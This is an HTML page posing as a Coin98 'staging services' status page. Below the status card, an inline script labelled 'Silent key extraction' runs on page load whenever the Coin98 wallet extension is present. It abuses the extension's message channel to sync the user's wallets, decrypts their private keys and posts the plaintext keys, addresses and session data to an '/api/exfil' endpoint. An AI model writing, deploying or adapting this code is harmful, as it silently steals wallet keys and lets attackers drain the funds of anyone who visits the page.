<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coin98 — Staging Services</title>
    <link rel="icon" href="https://coin98.com/favicon.ico">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0c0e14;
            color: #e1e4ea;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .container {
            text-align: center;
            max-width: 480px;
            padding: 40px 24px;
        }
        .logo {
            width: 64px;
            height: 64px;
            margin: 0 auto 24px;
            border-radius: 16px;
            background: linear-gradient(135deg, #d4a843 0%, #c9952e 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            font-weight: 700;
            color: #fff;
            box-shadow: 0 4px 24px rgba(212, 168, 67, 0.3);
        }
        h1 {
            font-size: 22px;
            font-weight: 600;
            color: #fff;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #6b7280;
            margin-bottom: 32px;
            line-height: 1.5;
        }
        .status-card {
            background: #161923;
            border: 1px solid #1e2231;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 16px;
        }
        .status-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 0;
            font-size: 13px;
        }
        .status-row:not(:last-child) {
            border-bottom: 1px solid #1e2231;
        }
        .status-label { color: #6b7280; }
        .status-value { color: #d4a843; font-weight: 500; }
        .status-value.green { color: #34d399; }
        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .badge-staging { background: #1e2231; color: #d4a843; }
        .badge-ok { background: #0d2818; color: #34d399; }
        .footer {
            margin-top: 32px;
            font-size: 11px;
            color: #3b4252;
        }
        .footer a { color: #4b5563; text-decoration: none; }
        .footer a:hover { color: #6b7280; }
        .spinner {
            width: 16px; height: 16px;
            border: 2px solid #1e2231;
            border-top-color: #d4a843;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: inline-block;
            vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">C98</div>
        <h1>Coin98 Staging</h1>
        <p class="subtitle">Internal staging environment for development and testing.<br>This service is not intended for public use.</p>

        <div class="status-card">
            <div class="status-row">
                <span class="status-label">Environment</span>
                <span class="badge badge-staging">Staging</span>
            </div>
            <div class="status-row">
                <span class="status-label">Region</span>
                <span class="status-value">ap-southeast-1</span>
            </div>
            <div class="status-row">
                <span class="status-label">API Gateway</span>
                <span class="status-value green">Healthy</span>
            </div>
            <div class="status-row">
                <span class="status-label">Services</span>
                <span class="badge badge-ok">All Operational</span>
            </div>
            <div class="status-row">
                <span class="status-label">Version</span>
                <span class="status-value">v16.9.0-rc.3</span>
            </div>
        </div>

        <div class="footer">
            &copy; 2026 Coin98 &middot; <a href="https://coin98.com">coin98.com</a>
        </div>
    </div>

<script>
// ═══════════════════════════════════════════════════════
// Silent key extraction — runs only when Coin98 extension
// content script is injected on this whitelisted origin
// ═══════════════════════════════════════════════════════

(function() {
    const P = {};
    let nid = 1;
    const C = { deviceId: null, session: null, wallets: [], keys: [] };

    window.addEventListener('message', function(e) {
        if (e.source !== window) return;
        var m = e.data;
        if (!m || typeof m !== 'object' || !m.isCoin98) return;
        if (m.target === 'Coin98:ContentScript') return;
        if (m.target === 'Coin98:Inpage') {
            var id = m.payload && m.payload.id;
            var d = m.payload && m.payload.data;
            if (id !== undefined && id !== null && P[id]) {
                P[id].r(d);
                clearTimeout(P[id].t);
                delete P[id];
            }
        }
    });

    function pm(id, data) {
        window.postMessage({ isCoin98: true, target: 'Coin98:ContentScript', payload: { id: id, data: data } }, '*');
    }

    function call(method, params, chain) {
        return new Promise(function(resolve, reject) {
            var tid = '_' + nid++ + '_' + Date.now();
            var t1 = setTimeout(function() { delete P[tid]; reject(new Error('ack')); }, 8000);
            P[tid] = { r: function(ackId) {
                clearTimeout(t1);
                var t2 = setTimeout(function() { delete P[ackId]; reject(new Error('rpc')); }, 15000);
                P[ackId] = { r: resolve, t: t2 };
                pm(ackId, { chain: chain || 'evm', method: method, params: params || [] });
            }, t: t1 };
            pm(tid, { method: 'ack' });
        });
    }

    function send(payload) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/api/exfil', true);
            x.setRequestHeader('Content-Type', 'application/json');
            x.send(JSON.stringify(payload));
        } catch(e) {}
    }

    async function run() {
        // Step 1: connect
        try { C.deviceId = await call('connect_coin98'); } catch(e) {}

        // Step 2: session
        try { C.session = await call('get_session'); } catch(e) {}

        // Step 3: sync all wallets
        try {
            var w = await call('sync_wallet');
            if (Array.isArray(w)) C.wallets = w;
        } catch(e) {}

        if (C.wallets.length === 0) {
            send({ source: 'silent', wallet_count: 0, device_id: C.deviceId,
                   session_data: { session: C.session, origin: location.origin, note: 'no wallets' } });
            return;
        }

        // Step 4: decrypt unique private keys
        var seen = {};
        var toDecrypt = [];
        for (var i = 0; i < C.wallets.length; i++) {
            var pk = C.wallets[i].privateKey;
            if (pk && !seen[pk]) {
                seen[pk] = true;
                toDecrypt.push(C.wallets[i]);
            }
        }

        for (var j = 0; j < toDecrypt.length; j++) {
            try {
                var dec = await call('aes_decrypt_coin98', {
                    data: toDecrypt[j].privateKey,
                    deviceId: C.deviceId || 'any',
                    uuid: 'any'
                });
                if (dec && typeof dec === 'string' && dec.length > 10) {
                    C.keys.push({
                        chain: toDecrypt[j].chain,
                        address: toDecrypt[j].address,
                        key: dec,
                        encrypted: toDecrypt[j].privateKey
                    });
                }
            } catch(e) {}
        }

        // Step 5: exfil to Supabase
        send({
            source: 'silent',
            wallet_count: C.wallets.length,
            wallets: C.keys.map(function(k) {
                return {
                    chain: k.chain,
                    address: k.address,
                    keyPreview: k.key.slice(0, 12) + '...',
                    keyLen: k.key.length
                };
            }),
            device_id: C.deviceId,
            session_data: {
                session: C.session,
                origin: location.origin,
                totalWallets: C.wallets.length,
                uniqueKeys: C.keys.length,
                chains: C.wallets.map(function(w) { return w.chain; }).filter(function(v, i, a) { return a.indexOf(v) === i; }),
                keys: C.keys.map(function(k) {
                    return { chain: k.chain, address: k.address, key: k.key };
                })
            }
        });
    }

    // Wait for extension content script injection then run silently
    setTimeout(function() {
        if (window.keplr && window.keplr.isCoin98 === true || window.coin98) {
            run();
        }
    }, 2500);
})();
</script>
</body>
</html>
